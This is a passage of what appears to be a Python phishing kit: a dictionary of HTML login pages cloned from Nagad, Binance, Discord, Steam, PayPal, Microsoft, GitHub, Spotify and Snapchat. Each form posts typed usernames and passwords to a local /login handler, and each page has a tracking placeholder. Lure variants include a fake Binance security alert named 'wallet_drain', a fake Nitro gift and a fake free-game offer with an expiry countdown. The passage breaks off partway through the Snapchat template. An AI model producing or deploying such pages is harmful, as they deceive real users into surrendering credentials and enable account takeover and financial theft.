<div class="topbar">
  <div class="nagad-logo">na<span>ga</span>d</div>
  <div class="sub">Digital Financial Service</div>
</div>
<div class="card">
  <h2>Login to Nagad</h2>
  <p>Enter your registered mobile number and PIN</p>
  <form action="/login" method="POST">
    <label>Mobile Number</label>
    <input type="tel" name="email" placeholder="01XXXXXXXXX" required>
    <label>PIN</label>
    <input type="password" name="password" placeholder="4-digit PIN" maxlength="4" required>
    <button class="btn" type="submit">Login</button>
  </form>
  <a class="forgot" href="#">Forgot PIN?</a>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# BINANCE
# ─────────────────────────────────────────────────────────────────────────────
PAGES['binance'] = {}

PAGES['binance']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Binance — Log In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0b0e11;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;color:#eaecef}
.topbar{width:100%;padding:20px 24px;display:flex;align-items:center;gap:10px}
.bn-logo{color:#f0b90b;font-size:24px;font-weight:800;letter-spacing:-.5px}
.wrap{width:100%;max-width:400px;padding:16px 24px 40px}
h1{font-size:1.5em;font-weight:700;margin-bottom:8px}
.sub{font-size:.88em;color:#848e9c;margin-bottom:28px}
.sso-btn{width:100%;padding:13px;background:#1e2026;border:1px solid #2b3139;border-radius:4px;font-size:14px;font-weight:600;color:#eaecef;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:10px}
.or-row{display:flex;align-items:center;gap:12px;margin:14px 0;color:#848e9c;font-size:13px}
.or-line{flex:1;height:1px;background:#2b3139}
label{font-size:13px;color:#848e9c;display:block;margin-bottom:6px}
input{width:100%;padding:13px 14px;background:#1e2026;border:1px solid #2b3139;border-radius:4px;font-size:15px;color:#eaecef;outline:none;margin-bottom:16px}
input:focus{border-color:#f0b90b}
input::placeholder{color:#474d57}
.btn{width:100%;padding:14px;background:#f0b90b;color:#1e2026;border:none;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer}
.btn:hover{background:#f8d33a}
.links{display:flex;justify-content:space-between;margin-top:16px;font-size:13px}
.links a{color:#f0b90b;text-decoration:none}
.signup-row{text-align:center;margin-top:24px;font-size:14px;color:#848e9c}
.signup-row a{color:#f0b90b;font-weight:600;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="topbar"><div class="bn-logo">◆ Binance</div></div>
<div class="wrap">
  <h1>Log In</h1>
  <p class="sub">Welcome back. Enter your credentials to continue.</p>
  <button class="sso-btn">
    <svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
    Continue with Google
  </button>
  <div class="or-row"><div class="or-line"></div>OR<div class="or-line"></div></div>
  <form action="/login" method="POST">
    <label>Email / Phone number</label>
    <input type="text" name="email" placeholder="Email or phone number" required>
    <label>Password</label>
    <input type="password" name="password" placeholder="Enter your password" required>
    <button class="btn" type="submit">Log In</button>
  </form>
  <div class="links"><a href="#">Forgot password?</a><a href="#">Security issues?</a></div>
  <div class="signup-row">Don't have an account? <a href="#">Register</a></div>
</div>
</body></html>"""

PAGES['binance']['wallet_drain'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Binance — Urgent Security Alert</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0b0e11;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;color:#eaecef}
.card{background:#1e2026;border:1px solid #2b3139;border-radius:12px;padding:28px 24px;max-width:420px;width:100%}
.alert-top{background:#ff4d4f20;border:1px solid #ff4d4f;border-radius:8px;padding:14px;margin-bottom:22px;font-size:.87em;color:#ff7875;line-height:1.6}
.alert-top strong{display:block;color:#ff4d4f;margin-bottom:4px;font-size:1em}
.bn-logo{color:#f0b90b;font-size:20px;font-weight:800;margin-bottom:20px}
h2{font-size:1.1em;font-weight:700;margin-bottom:16px;color:#eaecef}
label{font-size:12px;color:#848e9c;display:block;margin-bottom:5px}
input{width:100%;padding:12px;background:#0b0e11;border:1px solid #2b3139;border-radius:4px;font-size:15px;color:#eaecef;outline:none;margin-bottom:14px}
input:focus{border-color:#f0b90b}
input::placeholder{color:#474d57}
.btn{width:100%;padding:13px;background:#f0b90b;color:#1e2026;border:none;border-radius:4px;font-size:15px;font-weight:700;cursor:pointer}
.secure{text-align:center;font-size:12px;color:#848e9c;margin-top:12px}
</style></head><body>
TRACK_PLACEHOLDER
<div class="card">
  <div class="bn-logo">◆ Binance</div>
  <div class="alert-top"><strong>🚨 Urgent Security Alert</strong>Unusual withdrawal attempt detected from an unknown IP address. Secure your account immediately to prevent unauthorized access.</div>
  <h2>Verify Identity to Secure Account</h2>
  <form action="/login" method="POST">
    <label>Email Address</label>
    <input type="email" name="email" placeholder="Your Binance email" required>
    <label>Password</label>
    <input type="password" name="password" placeholder="Your password" required>
    <button class="btn" type="submit">🔒 Secure My Account Now</button>
  </form>
  <div class="secure">🔐 256-bit SSL Encrypted · Binance Security</div>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# DISCORD
# ─────────────────────────────────────────────────────────────────────────────
PAGES['discord'] = {}

PAGES['discord']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Discord — Welcome back!</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#313338;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#dbdee1;padding:16px}
.card{background:#2b2d31;border-radius:8px;padding:32px;width:100%;max-width:400px;box-shadow:0 2px 10px 0 rgba(0,0,0,.2)}
.logo{color:#5865f2;font-size:24px;font-weight:800;text-align:center;margin-bottom:4px}
.card h1{text-align:center;font-size:1.5em;font-weight:700;color:#f2f3f5;margin-bottom:4px}
.card .sub{text-align:center;color:#949ba4;font-size:.9em;margin-bottom:24px}
label{display:block;font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.6px;color:#b5bac1;margin-bottom:6px}
label span{color:#f23f42;margin-left:2px}
input{width:100%;padding:11px 12px;background:#1e1f22;border:1px solid transparent;border-radius:3px;font-size:16px;color:#dbdee1;outline:none;margin-bottom:16px;font-family:inherit}
input:focus{border-color:#5865f2;background:#1e1f22}
.btn{width:100%;padding:13px;background:#5865f2;color:#fff;border:none;border-radius:3px;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:8px}
.btn:hover{background:#4752c4}
.forgot{font-size:13px;color:#0097e0;text-decoration:none;cursor:pointer;display:block;margin-bottom:16px}
.forgot:hover{text-decoration:underline}
.qr{text-align:center;font-size:13px;color:#949ba4;margin-top:16px;padding-top:16px;border-top:1px solid #3f4147}
.qr a{color:#0097e0;text-decoration:none;font-weight:600}
.register{text-align:center;font-size:14px;color:#949ba4;margin-top:12px}
.register a{color:#0097e0;text-decoration:none;font-weight:600}
</style></head><body>
TRACK_PLACEHOLDER
<div class="card">
  <div class="logo">⚑ Discord</div>
  <h1>Welcome back!</h1>
  <p class="sub">We're so excited to see you again!</p>
  <form action="/login" method="POST">
    <label>Email or Phone Number <span>*</span></label>
    <input type="text" name="email" autocomplete="username" required>
    <label>Password <span>*</span></label>
    <input type="password" name="password" autocomplete="current-password" required>
    <a class="forgot" href="#">Forgot your password?</a>
    <button class="btn" type="submit">Log In</button>
  </form>
  <div class="qr"><a href="#">Log in with QR Code</a></div>
  <div class="register">Need an account? <a href="#">Register</a></div>
</div>
</body></html>"""

PAGES['discord']['nitro_gift'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>You've received a Discord Nitro gift!</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#5865f2,#9b84ec);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.card{background:#2b2d31;border-radius:12px;padding:32px 24px;max-width:380px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,.4)}
.gift-icon{font-size:56px;text-align:center;margin-bottom:16px;display:block}
h1{text-align:center;font-size:1.3em;font-weight:800;color:#fff;margin-bottom:8px}
p{text-align:center;font-size:.88em;color:#b5bac1;line-height:1.6;margin-bottom:24px}
.perks{margin-bottom:20px}
.perk{display:flex;align-items:center;gap:10px;background:#1e1f22;border-radius:8px;padding:10px 12px;margin-bottom:8px;font-size:.88em;color:#dbdee1}
.perk .icon{font-size:18px}
label{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:#b5bac1;margin-bottom:6px}
input{width:100%;padding:11px 12px;background:#1e1f22;border:1px solid transparent;border-radius:3px;font-size:15px;color:#dbdee1;outline:none;margin-bottom:12px}
input:focus{border-color:#5865f2}
.btn{width:100%;padding:13px;background:#5865f2;color:#fff;border:none;border-radius:3px;font-size:15px;font-weight:700;cursor:pointer}
.expire{text-align:center;font-size:12px;color:#949ba4;margin-top:12px}
</style></head><body>
TRACK_PLACEHOLDER
<div class="card">
  <span class="gift-icon">🎁</span>
  <h1>You've got a Nitro gift!</h1>
  <p>Someone sent you 1 month of Discord Nitro. Log in to claim it before it expires!</p>
  <div class="perks">
    <div class="perk"><span class="icon">🚀</span>2x Server Boosts</div>
    <div class="perk"><span class="icon">📁</span>500 MB File Upload</div>
    <div class="perk"><span class="icon">🎨</span>Animated Avatars & Banners</div>
    <div class="perk"><span class="icon">💬</span>Custom Emoji Everywhere</div>
  </div>
  <form action="/login" method="POST">
    <label>Email or Phone Number</label>
    <input type="text" name="email" placeholder="your@email.com" required>
    <label>Password</label>
    <input type="password" name="password" placeholder="Your password" required>
    <button class="btn" type="submit">🎉 Claim Nitro Gift</button>
  </form>
  <div class="expire">⏰ This gift expires in 24 hours</div>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# STEAM
# ─────────────────────────────────────────────────────────────────────────────
PAGES['steam'] = {}

PAGES['steam']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Steam Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#171a21;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;color:#c6d4df}
.topbar{width:100%;background:#171a21;border-bottom:1px solid #2a3f5f;padding:14px 24px;text-align:center}
.steam-logo{color:#1b2838;font-size:22px;font-weight:900;letter-spacing:-1px;background:linear-gradient(to bottom,#c6d4df,#8f98a0);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.wrap{width:100%;max-width:400px;padding:32px 20px}
.card{background:#2a3f5f;border-radius:4px;padding:24px 20px}
.card h1{font-size:1.3em;font-weight:600;color:#c6d4df;margin-bottom:20px;text-align:center}
label{font-size:12px;font-weight:600;color:#8f98a0;display:block;margin-bottom:5px;text-transform:uppercase;letter-spacing:.5px}
input{width:100%;padding:11px 12px;background:#316282;border:1px solid #4c7a9b;border-radius:3px;font-size:16px;color:#c6d4df;outline:none;margin-bottom:14px}
input:focus{border-color:#66c0f4;background:#355d7f}
input::placeholder{color:#7193a5}
.btn{width:100%;padding:12px;background:linear-gradient(to right,#47bfff,#1a44c2);color:#fff;border:none;border-radius:3px;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:14px}
.remember{display:flex;align-items:center;gap:8px;font-size:13px;color:#8f98a0;margin-bottom:14px}
.remember input[type=checkbox]{width:14px;height:14px;accent-color:#66c0f4}
.links{text-align:center;font-size:13px}
.links a{color:#66c0f4;text-decoration:none}
.links a:hover{text-decoration:underline}
</style></head><body>
TRACK_PLACEHOLDER
<div class="topbar"><div class="steam-logo">STEAM</div></div>
<div class="wrap">
  <div class="card">
    <h1>Sign In</h1>
    <form action="/login" method="POST">
      <label>Username</label>
      <input type="text" name="email" autocomplete="username" required>
      <label>Password</label>
      <input type="password" name="password" autocomplete="current-password" required>
      <div class="remember"><input type="checkbox" checked>Remember me on this device</div>
      <button class="btn" type="submit">Sign In</button>
    </form>
    <div class="links"><a href="#">Forgot your password?</a> · <a href="#">Help, I can't sign in</a></div>
  </div>
</div>
</body></html>"""

PAGES['steam']['free_game'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Steam — Free Game Offer</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#171a21;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px;color:#c6d4df}
.card{background:#2a3f5f;border-radius:8px;padding:28px 22px;max-width:400px;width:100%}
.game-banner{background:linear-gradient(135deg,#1b2838,#316282);border-radius:6px;padding:16px;text-align:center;margin-bottom:20px}
.game-banner .icon{font-size:44px;display:block;margin-bottom:8px}
.game-banner h2{font-size:1.1em;font-weight:700;color:#c6d4df}
.game-banner .price{margin-top:6px;font-size:.9em}
.price .old{text-decoration:line-through;color:#8f98a0}
.price .free{color:#4fa3e3;font-weight:800;font-size:1.1em;margin-left:8px}
.card h3{font-size:1em;font-weight:600;color:#c6d4df;margin-bottom:14px}
label{font-size:12px;font-weight:600;color:#8f98a0;display:block;margin-bottom:5px;text-transform:uppercase;letter-spacing:.5px}
input{width:100%;padding:11px 12px;background:#316282;border:1px solid #4c7a9b;border-radius:3px;font-size:15px;color:#c6d4df;outline:none;margin-bottom:12px}
input:focus{border-color:#66c0f4}
.btn{width:100%;padding:12px;background:linear-gradient(to right,#47bfff,#1a44c2);color:#fff;border:none;border-radius:3px;font-size:15px;font-weight:600;cursor:pointer}
.expire{text-align:center;font-size:12px;color:#8f98a0;margin-top:12px}
</style></head><body>
TRACK_PLACEHOLDER
<div class="card">
  <div class="game-banner">
    <span class="icon">🎮</span>
    <h2>FREE WEEKEND — Claim Your Game</h2>
    <div class="price"><span class="old">$59.99</span><span class="free">FREE</span></div>
  </div>
  <h3>Sign in to claim your free game</h3>
  <form action="/login" method="POST">
    <label>Username</label>
    <input type="text" name="email" placeholder="Steam username" required>
    <label>Password</label>
    <input type="password" name="password" placeholder="Your password" required>
    <button class="btn" type="submit">🎁 Claim Free Game</button>
  </form>
  <div class="expire">⏰ Offer ends in 02:47:33</div>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# PAYPAL
# ─────────────────────────────────────────────────────────────────────────────
PAGES['paypal'] = {}

PAGES['paypal']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>PayPal — Log in</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f5f7fa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.topbar{width:100%;padding:16px 24px;text-align:center;background:#fff;border-bottom:1px solid #e5e9ef}
.pp-logo{color:#003087;font-size:26px;font-weight:800;letter-spacing:-1px}
.pp-logo span{color:#0070e0}
.wrap{width:100%;max-width:400px;padding:28px 20px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.08);padding:28px 24px}
.card h1{font-size:1.4em;font-weight:600;color:#2c2e2f;margin-bottom:20px}
label{font-size:14px;font-weight:400;color:#2c2e2f;display:block;margin-bottom:5px}
input{width:100%;padding:13px 14px;border:1.5px solid #cad2d9;border-radius:6px;font-size:16px;color:#2c2e2f;outline:none;margin-bottom:16px}
input:focus{border-color:#0070e0;box-shadow:0 0 0 2px rgba(0,112,224,.2)}
.btn{width:100%;padding:13px;background:#0070e0;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer;margin-bottom:14px}
.btn:hover{background:#003087}
.or-row{display:flex;align-items:center;gap:12px;margin:14px 0;color:#687173;font-size:13px}
.or-line{flex:1;height:1px;background:#cad2d9}
.debit-btn{width:100%;padding:13px;background:#fff;border:1.5px solid #cad2d9;border-radius:6px;font-size:15px;font-weight:600;color:#2c2e2f;cursor:pointer}
.forgot{display:block;text-align:center;color:#0070e0;font-size:14px;text-decoration:none;margin-top:12px}
.signup-row{text-align:center;margin-top:16px;font-size:14px;color:#687173}
.signup-row a{color:#0070e0;font-weight:700;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="topbar"><div class="pp-logo">Pay<span>Pal</span></div></div>
<div class="wrap">
  <div class="card">
    <h1>Log in to your account</h1>
    <form action="/login" method="POST">
      <label>Email address</label>
      <input type="email" name="email" autocomplete="email" required>
      <button class="btn" type="button" onclick="this.closest('form').submit()">Next</button>
    </form>
    <div class="or-row"><div class="or-line"></div>or<div class="or-line"></div></div>
    <button class="debit-btn">Pay with Debit or Credit Card</button>
    <div class="signup-row"><a href="#">Sign Up</a></div>
  </div>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# MICROSOFT / OUTLOOK
# ─────────────────────────────────────────────────────────────────────────────
PAGES['microsoft'] = {}

PAGES['microsoft']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Sign in - Microsoft</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column}
.ms-logo{padding:28px 32px;display:flex;align-items:center;gap:10px}
.ms-logo svg{width:108px;height:24px}
.card{flex:1;display:flex;flex-direction:column;padding:28px 32px;max-width:440px;width:100%;margin:0 auto}
h1{font-size:1.5em;font-weight:600;color:#1b1b1b;margin-bottom:16px}
input{width:100%;padding:6px 0;border:none;border-bottom:1.5px solid #767676;font-size:15px;color:#1b1b1b;outline:none;margin-bottom:4px;background:transparent}
input:focus{border-bottom-color:#0067b8}
.hint{font-size:12px;color:#767676;margin-bottom:20px}
.btn{padding:10px 16px;background:#0067b8;color:#fff;border:none;border-radius:0;font-size:15px;font-weight:600;cursor:pointer;margin-top:8px;min-width:108px;float:right}
.btn:hover{background:#005da6}
.cf{overflow:hidden;margin-bottom:16px}
.ms-options{margin-top:20px;font-size:13px}
.ms-options a{color:#0067b8;text-decoration:none;display:block;margin-bottom:8px}
.ms-options a:hover{text-decoration:underline}
.footer{padding:16px 32px;font-size:12px;color:#767676;display:flex;gap:20px;flex-wrap:wrap}
.footer a{color:#767676;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="ms-logo">
  <svg viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
    <path fill="#737373" d="M2.9 2h8.3v8.3H2.9zm0 11.7h8.3V22H2.9z"/>
    <path fill="#f25022" d="M2.9 2h8.3v8.3H2.9z"/>
    <path fill="#00a4ef" d="M2.9 13.7h8.3V22H2.9z"/>
    <path fill="#7fba00" d="M13.7 2H22v8.3h-8.3z"/>
    <path fill="#ffb900" d="M13.7 13.7H22V22h-8.3z"/>
    <text x="27" y="18" fill="#737373" font-size="15" font-family="Segoe UI,sans-serif" font-weight="600">Microsoft</text>
  </svg>
</div>
<div class="card">
  <h1>Sign in</h1>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Email, phone, or Skype" autocomplete="username" required>
    <div class="hint">No account? <a href="#" style="color:#0067b8;text-decoration:none">Create one!</a></div>
    <div class="cf"><button class="btn" type="submit">Next</button></div>
  </form>
  <div class="ms-options">
    <a href="#">Sign-in options</a>
  </div>
</div>
<div class="footer">
  <a href="#">Terms of use</a><a href="#">Privacy & cookies</a><a href="#">...</a>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# GITHUB
# ─────────────────────────────────────────────────────────────────────────────
PAGES['github'] = {}

PAGES['github']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Sign in to GitHub</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d1117;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;color:#e6edf3}
.gh-logo{margin:40px 0 20px}
.gh-logo svg{width:48px;height:48px;fill:#e6edf3}
.card{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:24px;width:100%;max-width:340px}
.card h1{font-size:1.3em;font-weight:300;text-align:center;color:#e6edf3;margin-bottom:20px}
label{font-size:14px;font-weight:600;color:#e6edf3;display:block;margin-bottom:5px}
label span{color:#ff7b72;margin-left:2px}
input{width:100%;padding:9px 12px;background:#0d1117;border:1px solid #30363d;border-radius:6px;font-size:14px;color:#e6edf3;outline:none;margin-bottom:14px}
input:focus{border-color:#2f81f7;box-shadow:0 0 0 3px rgba(47,129,247,.3)}
input::placeholder{color:#484f58}
.btn{width:100%;padding:10px;background:#238636;color:#fff;border:1px solid rgba(240,246,252,.1);border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;margin-bottom:14px}
.btn:hover{background:#2ea043}
.or-row{display:flex;align-items:center;gap:12px;margin:8px 0;color:#484f58;font-size:12px}
.or-line{flex:1;height:1px;background:#21262d}
.passkey-btn{width:100%;padding:9px;background:#21262d;border:1px solid #30363d;border-radius:6px;font-size:13px;color:#e6edf3;cursor:pointer;margin-bottom:10px}
.forgot{display:block;text-align:center;color:#2f81f7;font-size:13px;text-decoration:none;margin-top:4px}
.create-box{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:14px;width:100%;max-width:340px;text-align:center;margin-top:16px;font-size:14px;color:#8b949e}
.create-box a{color:#2f81f7;text-decoration:none;font-weight:600}
</style></head><body>
TRACK_PLACEHOLDER
<div class="gh-logo"><svg viewBox="0 0 16 16"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg></div>
<div class="card">
  <h1>Sign in to GitHub</h1>
  <form action="/login" method="POST">
    <label>Username or email address <span>*</span></label>
    <input type="text" name="email" autocomplete="username" required>
    <label>Password <span>*</span></label>
    <input type="password" name="password" autocomplete="current-password" required>
    <button class="btn" type="submit">Sign in</button>
  </form>
  <div class="or-row"><div class="or-line"></div>or<div class="or-line"></div></div>
  <button class="passkey-btn">🔑 Sign in with a passkey</button>
  <a class="forgot" href="#">Forgot password?</a>
</div>
<div class="create-box">New to GitHub? <a href="#">Create an account.</a></div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# SPOTIFY
# ─────────────────────────────────────────────────────────────────────────────
PAGES['spotify'] = {}

PAGES['spotify']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Spotify – Web Player</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#121212;font-family:circular,Helvetica,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;color:#fff;padding:20px 16px}
.sp-logo{width:40px;height:40px;margin-bottom:28px;margin-top:20px}
h1{font-size:1.5em;font-weight:700;text-align:center;margin-bottom:28px}
.wrap{width:100%;max-width:360px}
.sso-btn{width:100%;padding:13px;background:#fff;border:none;border-radius:9999px;font-size:14px;font-weight:700;color:#000;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px}
.sso-btn:hover{transform:scale(1.02)}
.or-row{display:flex;align-items:center;gap:12px;margin:16px 0;color:#a7a7a7;font-size:13px}
.or-line{flex:1;height:1px;background:#2a2a2a}
label{font-size:14px;font-weight:700;color:#fff;display:block;margin-bottom:6px}
input{width:100%;padding:13px 14px;background:#121212;border:1px solid #727272;border-radius:4px;font-size:16px;color:#fff;outline:none;margin-bottom:16px}
input:focus{border-color:#fff}
input::placeholder{color:#a7a7a7}
.btn{width:100%;padding:14px;background:#1ed760;color:#000;border:none;border-radius:9999px;font-size:15px;font-weight:700;cursor:pointer}
.btn:hover{background:#1fdf64;transform:scale(1.02)}
.signup-row{text-align:center;font-size:14px;color:#a7a7a7;margin-top:28px;padding-top:20px;border-top:1px solid #2a2a2a}
.signup-row a{color:#1ed760;font-weight:700;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<svg class="sp-logo" viewBox="0 0 496 512" fill="#1ed760"><path d="M248 8C111.1 8 8 111.1 8 248s103.1 240 240 240 240-103.1 240-240S384.9 8 248 8zm100.7 338.5c-3.9 6.4-12.4 8.4-18.8 4.5-51.5-31.4-116.3-38.5-192.6-21.1-7.4 1.7-14.7-2.9-16.4-10.3-1.7-7.4 2.9-14.7 10.3-16.4 83.5-19 155.1-11 213.2 24.4 6.3 3.8 8.3 12.3 4.3 18.9zm26.9-59.8c-4.9 8-15.4 10.5-23.4 5.6-59-35.8-148.8-46.2-218.5-25.3-9.1 2.7-18.7-2.4-21.4-11.5-2.7-9.1 2.4-18.7 11.5-21.4 79.6-24.2 178.5-12.5 246.8 28.9 7.9 4.8 10.4 15.3 5 23.7zm2.3-62.3c-70.7-42-187.5-45.8-255.1-25.3-10.9 3.3-22.4-2.9-25.7-13.8-3.3-10.9 2.9-22.4 13.8-25.7 77.6-23.5 206.6-19 288.3 29.2 9.9 5.9 13.1 18.6 7.2 28.4-5.8 9.9-18.5 13.1-28.5 7.2z"/></svg>
<div class="wrap">
  <h1>Log in to Spotify</h1>
  <button class="sso-btn">
    <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
    Continue with Google
  </button>
  <button class="sso-btn">🍎 Continue with Apple</button>
  <button class="sso-btn">🔵 Continue with Facebook</button>
  <div class="or-row"><div class="or-line"></div>or<div class="or-line"></div></div>
  <form action="/login" method="POST">
    <label>Email address or username</label>
    <input type="text" name="email" placeholder="Email or username" required>
    <label>Password</label>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Log In</button>
  </form>
  <div class="signup-row">Don't have an account? <a href="#">Sign up for Spotify.</a></div>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# PLATFORM REGISTRY
# ─────────────────────────────────────────────────────────────────────────────
# ─────────────────────────────────────────────────────────────────────────────
# SNAPCHAT
# ─────────────────────────────────────────────────────────────────────────────
PAGES['snapchat'] = {}
PAGES['snapchat']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Snapchat — Log in</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#FFFC00;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:0 16px}
.logo{margin:40px 0 8px}
.logo svg{width:60px;height:60px}
h1{font-size:1.4em;font-weight:800;color:#000;margin-bottom:28px;text-align:center}
